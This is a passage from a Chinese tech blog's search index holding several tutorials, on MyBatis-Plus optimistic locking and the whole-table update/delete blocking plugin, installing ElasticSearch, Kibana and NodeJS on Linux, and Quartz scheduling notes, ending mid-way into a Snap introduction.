万多元。如果这里使用乐观锁，在小王保存价格前，可以检查到价格是否被人修改过。如果价格被修改过，则重新取出被修改后的价格（150 元），这样他最终会将 120 元存入数据库。如果是使用悲观锁，在小李取出数据时，小王只能等小李完成价格的更改之后，才能对价格进行操作，这也会保证最终的价格是 120 元。 模拟数据更改冲突 创建数据库表 123456789101112-- 创建数据库表CREATE TABLE `t_product`( id BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT \'主键ID\', name VARCHAR(50) DEFAULT NULL COMMENT \'商品名称\', price DECIMAL(10, 5) DEFAULT 0 COMMENT \'价格\', version BIGINT(20) DEFAULT 0 COMMENT \'乐观锁版本号\', PRIMARY KEY (id)) ENGINE=InnoDB DEFAULT CHARSET=utf8;-- 插入表数据insert into t_product (id, name, price) values (1, \'C++ Primer Plus\', 100); 实体类 12345678910public class Product { private Long id; private String name; private Long version; private BigDecimal price; ... } Mapper 接口 123public interface ProductMapper extends BaseMapper&lt;Product&gt; {} Junit 测试代码 12345678910111213141516171819202122232425262728@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private ProductMapper productMapper; @Test public void updatePrice() { Product product1 = productMapper.selectById(1L); System.out.println("小李取出的商品价格:" + product1.getPrice()); Product product2 = productMapper.selectById(1L); System.out.println("小王取出的商品价格:" + product2.getPrice()); product1.setPrice(product1.getPrice().add(new BigDecimal(50))); int result1 = productMapper.updateById(product1); System.out.println("小李修改商品价格的结果: " + (result1 &gt; 0)); product2.setPrice(product2.getPrice().subtract(new BigDecimal(30))); int result2 = productMapper.updateById(product2); System.out.println("小王修改商品价格的结果: " + (result2 &gt; 0)); Product product3 = productMapper.selectById(1L); System.out.println("最终的商品价格: " + product3.getPrice()); }} 执行上面的测试代码后，控制台输出的日志信息如下，观察后可发现最终的商品价格并不是预期的 120 元。 12345小李取出的商品价格:100.00000小王取出的商品价格:100.00000小李修改商品价格的结果: true小王修改商品价格的结果: true最终的商品价格: 70.00000 乐观锁的实现流程 第一步：在数据库表中添加 version 字段 12345678CREATE TABLE `t_product`( id BIGINT(20) NOT NULL AUTO_INCREMENT COMMENT \'主键ID\', name VARCHAR(50) DEFAULT NULL COMMENT \'商品名称\', price DECIMAL(10, 5) DEFAULT 0 COMMENT \'价格\', version BIGINT(20) DEFAULT 0 COMMENT \'乐观锁版本号\', PRIMARY KEY (id)) ENGINE=InnoDB DEFAULT CHARSET=utf8; 第二步：读取数据库表记录时，获取当前记录的 version（oldVersion） 1select id, name, price, version from t_product where id = 1; 第三步：更新数据库表记录时，执行 version + 1，如果 where 语句中的 version 版本不满足条件，则更新失败 1update t_product set price = price + 50, version = version + 1 where id = 1 and version = oldVersion; 或者可以简单理解为以下的 SQL 语句 1update t_product set price = newPrice, version = newVersion where id = 1 and version = oldVersion; 乐观锁插件的使用乐观锁插件的配置步骤 第一步：使用 Spring XML 方式、 SpringBoot 配置类方式或者 MyBatis 配置文件方式中的任意一种配置乐观锁插件 第二步：在实体类的属性上添加 @Version 注解 配置乐观锁插件注入 MybatisPlusInterceptor 类，并配置 OptimisticLockerInnerInterceptor 拦截器。 Spring XML 方式1234567891011121314151617&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="plugins"&gt; &lt;array&gt; &lt;ref bean="mybatisPlusInterceptor"/&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="mybatisPlusInterceptor" class="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="interceptors"&gt; &lt;list&gt; &lt;ref bean="optimisticLockerInnerInterceptor"/&gt; &lt;/list&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="optimisticLockerInnerInterceptor" class="com.baomidou.mybatisplus.extension.plugins.inner.OptimisticLockerInnerInterceptor"/&gt; SpringBoot 配置类方式 配置类 1234567891011121314151617181920/** * MyBatis-Plus 配置类 */@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { /** * 添加 MyBatis-Plus 乐观锁插件 * * @return */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor()); return interceptor; }} 启动类 提示 特殊情况下，可能还需要在启动类上通过 @ComponentScan 注解来扫描上面定义的 MybatisPlusConfig 配置类。 123456789@SpringBootApplication@ComponentScan("com.clay.mybatis")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} MyBatis 配置文件方式12345678&lt;configuration&gt; &lt;plugins&gt; &lt;!-- property 的配置说明详见 MybatisPlusInterceptor.setProperties() 的源码方法注释 --&gt; &lt;plugin interceptor="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="@optimisticLocker" value="com.baomidou.mybatisplus.extension.plugins.inner.OptimisticLockerInnerInterceptor"/&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; 添加 @Version 注解在实体类的属性上添加 @Version 注解 1234567891011121314public class Product { private Long id; private String name; @Version private Long version; private BigDecimal price; ... } 特别注意 @Version 注解支持的数据类型只有：int，Integer，long，Long，Date，Timestamp，LocalDateTime 整数类型下 newVersion = oldVersion + 1，其中的 newVersion 会回写到 Entity 中 @Version 注解仅支持 updateById(id) 与 update(entity, wrapper) 方法 在使用 update(entity, wrapper) 方法的情况下，wrapper 不能复用！ Junit 单元测试代码 Mapper 接口 123public interface ProductMapper extends BaseMapper&lt;Product&gt; {} Junit 测试代码 12345678910111213141516171819202122232425262728@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private ProductMapper productMapper; @Test public void updatePrice() { Product product1 = productMapper.selectById(1L); System.out.println("小李取出的商品价格:" + product1.getPrice()); Product product2 = productMapper.selectById(1L); System.out.println("小王取出的商品价格:" + product2.getPrice()); product1.setPrice(product1.getPrice().add(new BigDecimal(50))); int result1 = productMapper.updateById(product1); System.out.println("小李修改商品价格的结果: " + (result1 &gt; 0)); product2.setPrice(product2.getPrice().subtract(new BigDecimal(30))); int result2 = productMapper.updateById(product2); System.out.println("小王修改商品价格的结果: " + (result2 &gt; 0)); Product product3 = productMapper.selectById(1L); System.out.println("最终的商品价格: " + product3.getPrice()); }} 执行上面的测试代码后，控制台输出的日志信息如下，观察后可发现最终只有小李成功更改了商品价格，也就是商品价格的更改不会再发生冲突。 12345678910111213141516171819202122232425==&gt; Preparing: SELECT id,name,price,version FROM t_product WHERE id=?==&gt; Parameters: 1(Long)&lt;== Columns: id, name, price, version&lt;== Row: 1, C++ Primer Plus, 100.00000, 0&lt;== Total: 1小李取出的商品价格:100.00000==&gt; Preparing: SELECT id,name,price,version FROM t_product WHERE id=?==&gt; Parameters: 1(Long)&lt;== Columns: id, name, price, version&lt;== Row: 1, C++ Primer Plus, 100.00000, 0&lt;== Total: 1小王取出的商品价格:100.00000==&gt; Preparing: UPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?==&gt; Parameters: C++ Primer Plus(String), 150.00000(BigDecimal), 1(Long), 1(Long), 0(Long)&lt;== Updates: 1小李修改商品价格的结果: true==&gt; Preparing: UPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?==&gt; Parameters: C++ Primer Plus(String), 70.00000(BigDecimal), 1(Long), 1(Long), 0(Long)&lt;== Updates: 0小王修改商品价格的结果: false最终的商品价格: 150.00000 优化测试代码 上面的测试代码可以加入更新重试机制，也就是在当前记录更新失败时，可以重新读取记录，然后再次尝试更新记录，示例代码如下： 1234567891011121314151617181920212223242526272829303132333435@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private ProductMapper productMapper; @Test public void updatePrice() { Product product1 = productMapper.selectById(1L); System.out.println("小李取出的商品价格:" + product1.getPrice()); Product product2 = productMapper.selectById(1L); System.out.println("小王取出的商品价格:" + product2.getPrice()); product1.setPrice(product1.getPrice().add(new BigDecimal(50))); int result1 = productMapper.updateById(product1); System.out.println("小李修改商品价格的结果: " + (result1 &gt; 0)); product2.setPrice(product2.getPrice().subtract(new BigDecimal(30))); int result2 = productMapper.updateById(product2); System.out.println("小王修改商品价格的结果: " + (result2 &gt; 0)); if (result2 == 0) { Product productNew = productMapper.selectById(1L); productNew.setPrice(productNew.getPrice().subtract(new BigDecimal(30))); int resultNew = productMapper.updateById(productNew); System.out.println("小王第二次修改商品价格的结果: " + (resultNew &gt; 0)); } Product product3 = productMapper.selectById(1L); System.out.println("最终的商品价格: " + product3.getPrice()); }} MyBatis-Plus 防全表更新与删除插件BlockAttackInnerInterceptor 拦截器作用于 update 和 delete 的 SQL 语句，可以阻止恶意的全表更新和全表删除操作。本节所需的案例代码，可以直接从 GitHub 下载对应章节 mybatis-plus-lesson-09。 防全表更新与删除插件的使用防全表更新与删除插件的配置步骤 只需要使用 Spring XML 方式、 SpringBoot 配置类方式或者 MyBatis 配置文件方式中的任意一种配置防全表更新与删除插件即可。 配置防全表更新与删除插件注入 MybatisPlusInterceptor 类，并配置 BlockAttackInnerInterceptor 拦截器。 Spring XML 方式1234567891011121314151617&lt;bean id="sqlSessionFactory" class="com.baomidou.mybatisplus.extension.spring.MybatisSqlSessionFactoryBean"&gt; &lt;property name="plugins"&gt; &lt;array&gt; &lt;ref bean="mybatisPlusInterceptor"/&gt; &lt;/array&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="mybatisPlusInterceptor" class="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="interceptors"&gt; &lt;list&gt; &lt;ref bean="blockAttackInnerInterceptor"/&gt; &lt;/list&gt; &lt;/property&gt;&lt;/bean&gt;&lt;bean id="blockAttackInnerInterceptor" class="com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor"/&gt; SpringBoot 配置类方式 配置类 1234567891011121314151617181920/** * MyBatis-Plus 配置类 */@Configuration@MapperScan("com.clay.mybatis.dao")public class MybatisPlusConfig { /** * 添加 MyBatis-Plus 防全表更新与删除插件 * * @return */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new BlockAttackInnerInterceptor()); return interceptor; }} 启动类 提示 特殊情况下，可能还需要在启动类上通过 @ComponentScan 注解来扫描上面定义的 MybatisPlusConfig 配置类。 123456789@SpringBootApplication@ComponentScan("com.clay.mybatis")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} MyBatis 配置文件方式12345678&lt;configuration&gt; &lt;plugins&gt; &lt;!-- property 的配置说明详见 MybatisPlusInterceptor.setProperties() 的源码方法注释 --&gt; &lt;plugin interceptor="com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor"&gt; &lt;property name="@blockAttack" value="com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor"/&gt; &lt;/plugin&gt; &lt;/plugins&gt;&lt;/configuration&gt; Junit 单元测试代码1234567891011121314151617181920@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; @Test public void deleteAll() { empMapper.delete(null); } @Test public void updateAll() { Employee employee = new Employee(); employee.setGender("1"); employee.setAge(26); empMapper.update(employee, null); }} 执行上面的测试代码后，若抛出如下的异常信息，则说明防全表更新与删除插件生效了 12345678910111213Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Prohibition of full table deletion at com.baomidou.mybatisplus.core.toolkit.ExceptionUtils.mpe(ExceptionUtils.java:49) at com.baomidou.mybatisplus.core.toolkit.Assert.isTrue(Assert.java:38) at com.baomidou.mybatisplus.core.toolkit.Assert.isFalse(Assert.java:50) at com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor.checkWhere(BlockAttackInnerInterceptor.java:74) at com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor.processDelete(BlockAttackInnerInterceptor.java:65)Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Prohibition of table update operation at com.baomidou.mybatisplus.core.toolkit.ExceptionUtils.mpe(ExceptionUtils.java:49) at com.baomidou.mybatisplus.core.toolkit.Assert.isTrue(Assert.java:38) at com.baomidou.mybatisplus.core.toolkit.Assert.isFalse(Assert.java:50) at com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor.checkWhere(BlockAttackInnerInterceptor.java:74) at com.baomidou.mybatisplus.extension.plugins.inner.BlockAttackInnerInterceptor.processUpdate(BlockAttackInnerInterceptor.java:70) var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java 数据库"},{title:"Linux 安装 ElasticSearch（单机）",url:"/posts/3ffff1a5.html",text:'前言本文主要介绍如何在 Linux 上安装单机版的 ElasticSearch，适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 版本说明 软件 版本 描述 JDK 11 ElasticSearch 7.2.0 JDK 安装由于 Elasticsearch 的运行依赖于 JDK，因此需要提前在 Linux 上安装 JDK，这里演示的是如何安装 Oracle JDK 11。 1234567891011121314151617181920212223242526272829303132# 下载# wget -O /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz https://download.oracle.com/otn/java/jdk/11.0.4+10/cf1bbcbf431a474eb9fc550051f4ee78/jdk-11.0.4_linux-x64_bin.tar.gz?AuthParam=1563538966_65e52109c4dec9c83ac76eed75b8af77# 解压# tar -xvf /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# 删除下载文件# rm /usr/local/jdk-11.0.4_linux-x64_bin.tar.gz# 创建java命令的软链接（会覆盖已安装的其他版本jdk）# ln -sf /usr/local/jdk-11.0.4/bin/java /usr/bin/java# ln -sf /usr/local/jdk-11.0.4/bin/javac /usr/bin/javac# 配置环境变量# vim /etc/profileJAVA_HOME=/usr/local/jdk-11.0.4JRE_HOME=/usr/local/jdk-11.0.4/jreCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME CLASSPATH PATH# 使环境变量生效# source /etc/profile# 验证环境变量是否生效，如果不生效建议重启系统# javac -versionjavac 11.0.4# java -versionjava version "11.0.4" 2019-07-16 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.4+10-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.4+10-LTS, mixed mode) ElasticSearch 安装提示 ElasticSearch 官方下载地址 123456789101112131415161718192021222324252627282930313233343536# 进入安装目录# cd /usr/local# 下载ES# wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# 解压ES# tar -xvf https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.2.0-linux-x86_64.tar.gz# 删除下载文件# rm -f elasticsearch-7.2.0-linux-x86_64.tar.gz# 创建ES用户组和用户，出于系统安全考虑，ElasticSearch不允许直接使用Root权限来启动# groupadd elasticsearch# useradd elasticsearch -g elasticsearch -p yourpassword# 更改ES文件的所属用户组及用户# chown -R elasticsearch:elasticsearch elasticsearch-7.2.0# 切换ES用户# su elasticsearch# 前台启动ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch# 或者后台启动ES$ cd elasticsearch-7.2.0/bin$ ./elasticsearch -d# 测试连接ES，当结果输出JSON数据则说明ES启动成功# curl -XGET "127.0.0.1:9200"# 关闭后台运行的ES# ps -aux|grep elasticsearch# kill -9 pid ElasticSearch 配置配置 JVM 内存123# 直接编辑ES的启动脚本# vim elasticsearch-7.2.0/bin/elasticsearchES_JAVA_OPTS="-Xms512m -Xmx512m" 配置端口、远程访问12345678910111213141516171819202122# 配置端口（默认端口为9200）# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.port: 9200# 配置远程访问# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1cluster.initial_master_nodes: ["node-1"] # 即node.name配置的值network.host: 192.168.25.131 # 当前ES的IP，或者network.host: 0.0.0.0# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 防火墙开放ES的端口9200# firewall-cmd --zone=public --permanent --add-port=9200/tcp# firewall-cmd --reload# 浏览器测试远程访问，输入URL地址：192.168.25.131:9200，当输出JSON数据则说明远程访问配置成功 ElasticSearch 插件安装 Head 插件Head 是 Elasticsearch 的集群管理插件，可以用于数据的浏览和查询。Elasticsearch 5.0 之后，elasticsearch-head 不再做为插件放在其 plugins 目录下了，要使用它则必须先安装 Git，然后通过 Git 拉取 Github 上的 elasticsearch-head 源码。运行 elasticsearch-head 需要用到 Grunt，而 Grunt 需要依赖 NPM 包管理器，因此 NodeJS 是必须要安装的，NodeJS 的安装可参考 本站教程。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 进入安装目录# cd /usr/local# 安装git、bzip2# yum install -y git bzip2 # Centos# apt-get install -y git bzip2 # Debian、Ubuntu# 下载源码# git clone https://github.com/mobz/elasticsearch-head.git# 更改文件的所属用户组及用户# chown -R elasticsearch:elasticsearch elasticsearch-head# 全局安装Grunt# npm install -g grunt-cli# 安装elasticsearch-head的依赖包# cd elasticsearch-head# npm install# 提示：如果npm的安装过程比较慢，可以使用cnpm替代npm来安装依赖包# 配置elasticsearch-head允许所有IP访问# vim /usr/local/elasticsearch-head/Gruntfile.js# 在connect--&gt;server--&gt;options下面添加：hostname: \'*\'# 修改elasticsearch-head的默认连接地址# vim /usr/local/elasticsearch-head/_site/app.js# 将this.base_uri = this.config.base_uri || this.prefs.get("app-base_uri") || "http://localhost:9200"中的localhost修改为ES的服务器IP地址# 配置ES允许跨域访问，在ES的配置文件末尾追加下面两行内容即可# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlhttp.cors.enabled: truehttp.cors.allow-origin: "*"# 防火墙开放elasticsearch-head的端口9100# firewall-cmd --zone=public --permanent --add-port=9100/tcp# firewall-cmd --reload# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 前台启动elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ grunt server# 或者后台启动elasticsearch-head$ cd /usr/local/elasticsearch-head/node_modules/grunt/bin$ nohup grunt server &gt; es-head.log 2&gt;&amp;1 &amp;# 测试访问elasticsearch-head，浏览器输入网址：http://192.168.25.131:9100 安装 Kibana 插件Kibana 是一个针对 Elasticsearch 的开源分析及可视化平台，使用 Kibana 可以查询、查看并与存储在 ES 索引的数据进行交互操作，也可以执行高级的数据分析，并能以图表、表格和地图的形式查看数据。 12345678910111213141516171819202122232425262728293031323334353637383940# 进入安装目录# cd /usr/local# 下载kibana# wget https://artifacts.elastic.co/downloads/kibana/kibana-7.2.0-linux-x86_64.tar.gz# 解压kibana# tar -xvf kibana-7.2.0-linux-x86_64.tar.gz# mv kibana-7.2.0-linux-x86_64 kibana-7.2.0# 删除下载文件# rm -f kibana-7.2.0-linux-x86_64.tar.gz# 更改文件的所属用户组及用户# chown -R elasticsearch:elasticsearch kibana-7.2.0# 修改ES服务的IP# vim kibana-7.2.0/config/kibana.yml# 将server.host、elasticsearch.hosts修改为ES的服务器IP地址，不能使用localhost或者127.0.0.1# 防火墙开放kibana的端口5601# firewall-cmd --zone=public --permanent --add-port=5601/tcp# firewall-cmd --reload# 切换ES用户# su elasticsearch# 后台启动ES$ cd /usr/local/elasticsearch-7.2.0/bin$ ./elasticsearch -d# 前台启动kibana$ cd /usr/local/kibana-7.2.0/bin$ ./kibana# 或者后台启动kibana$ cd /usr/local/kibana-7.2.0/bin$ nohup ./kibana &gt; kibana.log 2&gt;&amp;1 &amp;# 测试访问kibana，浏览器输入网址：http://192.168.25.131:5601 常见错误解决方案错误一 错误信息 1max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144] 解决方案 123456789# 永久修改# vim /etc/sysctl.confvm.max_map_count=262144# 使修改生效# /sbin/sysctl -p# 查看修改结果# sysctl vm.max_map_count 错误二 错误信息 1max file descriptors [4096] for elasticsearch process is too low, increase to at least [65536] 解决方案 123456789# 查看限制# ulimit -Hn# 针对elasticsearch用户，修改最大文件描述符数# vim /etc/security/limits.confelasticsearch hard nproc 4096elasticsearch soft nproc 4096elasticsearch hard nofile 1048576elasticsearch soft nofile 1048576 错误三 错误信息 1the default discovery settings are unsuitable for production use; at least one of [discovery.seed_hosts, discovery.seed_providers, cluster.initial_master_nodes] must be configured 解决方案 1234# 指定ES节点名称、Master节点# vim /usr/local/elasticsearch-7.2.0/config/elasticsearch.ymlnode.name: node-1 # ES节点名称cluster.initial_master_nodes: ["node-1"] # ES的主节点，即node-name配置的值 错误四 错误信息 1ERROR: bootstrap checks failed memory locking requested for elasticsearch process but memory is not locked 解决方案 1请参考这里的解决方案：https://www.cnblogs.com/hellxz/p/11009634.html var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Linux 安装 NodeJS",url:"/posts/fe4ed47c.html",text:'前言 Linux 环境下安装 NodeJS，可以选择手动编译安装或者直接使用编译好的二进制包来安装。如果是手动编译安装，需要安装对应版本的 gc++、python。本文适用于 Centos/Debian/Ubuntu 等 Linux 发行版系统。 NodeJS 编译安装 1234567891011121314151617181920212223242526# 软件依赖g++4.8.2python2.6 或者 python2.7# 下载源码压缩包# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0.tar.gz# 解压源码压缩包$ tar -xvf node-v10.16.0.tar.gz# 编译安装# cd node-v10.16.0# ./configure --prefix=/usr/local/node-10.16.0# make -j4# make install# 配置环境变量# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# 使环境变量生效# source /etc/profile# 查看Node、NPM的版本# npm -v# node -v NodeJS 二进制包安装 1234567891011121314151617181920# 进入安装目录# cd /usr/local# 下载已经编译好的二进制包# wget https://nodejs.org/dist/v10.16.0/node-v10.16.0-linux-x64.tar.xz# 解压二进制包# tar -xvf node-v10.16.0-linux-x64.tar.xz# mv node-v10.16.0-linux-x64 node-10.16.0# 配置环境变量# vim /etc/profileexport PATH=${PATH}:/usr/local/node-10.16.0/bin# 使环境变量生效# source /etc/profile# 查看Node、NPM的版本# npm -v# node -v 验证 NodeJs 是否安装成功 第一步：新建 JS 文件 web-server.js，代码内容如下： 12345678var http = require(\'http\');http.createServer(function (req, res) { res.writeHead(200, {\'Content-Type\': \'text/plain\'}); res.end(\'Hello World\\n\');}).listen(8888, \'127.0.0.1\');console.log(\'Server running at http://127.0.0.1:8888/\'); 第二步：运行 JS 脚本，然后浏览器测试访问 URL：http://127.0.0.1:8888 ，如果 NodeJS 安装成功，浏览器会输出信息：Hello World 1# node web-server.js 使用 CNPM 替代 NPM 12# 全局安装CNPM# npm install -g cnpm --registry=https://registry.npm.taobao.org var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Quartz 开发随笔",url:"/posts/e3b4a6cc.html",text:'控制 Quartz 只执行一次 纯 API 调用的代码 1234567891011121314public class ScheduleTest { private static final String JOB_NAME = "job"; private static final String JOB_GROUP = "jobGroup"; public void runOnceTime() throws Exception { Scheduler scheduler = schedulerFactory.getScheduler(); JobDetail jobDetail = JobBuilder.newJob(ScheduleJob.class).withIdentity(JOB_NAME, JOB_GROUP).build(); SimpleScheduleBuilder scheduleBuilder = SimpleScheduleBuilder.simpleSchedule().withIntervalInSeconds(0).withRepeatCount(0); Trigger trigger = TriggerBuilder.newTrigger().withIdentity(JOB_NAME, JOB_GROUP).withSchedule(scheduleBuilder).build(); scheduler.scheduleJob(jobDetail, trigger); scheduler.start(); }} Spring 的 XML 配置 1234567&lt;!-- 配置Spring项目启动后任务就执行一次 --&gt;&lt;bean id="rsh_simpleTrigger1" class="org.springframework.scheduling.quartz.SimpleTriggerFactoryBean"&gt; &lt;property name="jobDetail" ref="myJobDetail" /&gt; &lt;property name="startDelay" value="500" /&gt; &lt;property name="repeatInterval" value="0" /&gt; &lt;property name="repeatCount" value="0" /&gt;&lt;/bean&gt; Quartz 控制线程级别的暂停、恢复、停止 Quartz 提供了暂停调度（pauseTrigger、pauseJob）、恢复调度（resumeTrigger、resumeJob）、删除调度（deleteJob）等 API，但本质都是控制 Trigger 的触发，而非直接控制任务线程的运行。如果要进行线程级别的停止，可以调用 scheduler.interrupt() 方法来实现，此时 Job 类需要实现 InterruptableJob 接口。 Quartz 的 Misfire 策略 Quartz 中有一种 Job 接口是 StatefulJob（有状态任务），简单来说这种 Job 使用在不能并发执行的场景下。比如定义了某个任务，每分钟执行一次，对一些数据进行增删操作，正常执行时，每分钟执行的 Job 互不影响；但某个时刻出现了意外，某个任务执行了三分钟，那么当在这个任务持续执行的过程中，不希望并发执行另外两次定时任务的，这就需要使用有状态任务，而没有执行的两次定时任务就是 Misfired Job。还有一种使用场景就是当执行暂停调度（pauseTrigger、pauseJob），然后执行恢复调度 (resumeTrigger、resumeJob)，Quartz 会默认在恢复的时候把暂停期间没执行的任务弥补执行。对于判定是否为 Misfired Job，其实有很多条件，目前了解到的有： 调度暂停执行期间，预定的任务未执行 到执行时间时，上一个任务还未完成 过期时间已超过设置的 misfireThreshold 参数值 线程池中已没有空闲线程 线程池中虽有空闲线程，但有优先级更高的任务 产生 Misfire 后，Quartz 会根据 Misfire 策略进行任务的处理，其中 Trigger、CronTrigger、SimpleTrigger 的 Misfire 策略如下： MISFIRE_INSTRUCTION_SMART_POLICY，默认的策略 MISFIRE_INSTRUCTION_FIRE_ONCE_NOW，立即触发一次，触发后恢复正常的频率 MISFIRE_INSTRUCTION_DO_NOTHING，什么都不做，继续等下一次预定时间再触发 在 Spring 的 XML 配置中，Misfire 策略可以在 CronTriggerBean 中配置，同时需要在 quartz.properties 配置文件中指定 misfireThreshold 参数的值（单位为毫秒）。其中 misfireThreshold 表示实际执行时间与下一次应该执行时间之间的差值，超过这个差值就不会执行，低于这个差值就会执行。例如任务每 3 秒执行一次，配置 misfireThreshold=6000，当暂停低于 6 秒内，Quartz 会弥补执行，超过 6 秒就不再弥补执行。具体的配置如下： 12345&lt;bean id="cronTrigger" class="org.springframework.scheduling.quartz.CronTriggerBean"&gt; &lt;property name="jobDetail" ref="buildTask" /&gt; &lt;property name="cronExpression" value="0 30 16 ? * 6" /&gt; &lt;property name="misfireInstruction" value="2"&gt;&lt;/property&gt;&lt;/bean&gt; 1org.quartz.jobStore.misfireThreshold = 6000 Quartz Cron 表达式在线生成工具 CronMaker Cron Expression Generator Quartz 参考资料 基于 Quartz 开发企业级任务调度应用 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Centos7 下 Snap 的安装与使用",url:"/posts/ba754e9a.html",text:'Snap 介绍 Snap 是 Ubuntu 母公司 Canonical 于 2016 年 4 月发布 Ubuntu-16.04 时引入的一种全新的、安全的、易于管理的、沙盒化的软件包管理方式，与传统的 dpkg/apt 有着很大的区别，背后主要的动机是解决 Linux 平台的碎片化问题。Snap 的安装包扩展名是 .snap，类似于一个容器，它包含一个应用程序需要用到的所有文件和库（Snap 包里包含一个私有的 root 文件系统，里面包含了依赖的软件包）。不管底层系统如何，Snap 都可轻松安装、升级、降级和移除应用，因此 Snap 的应用程序很容易安装在任何基于 Linux 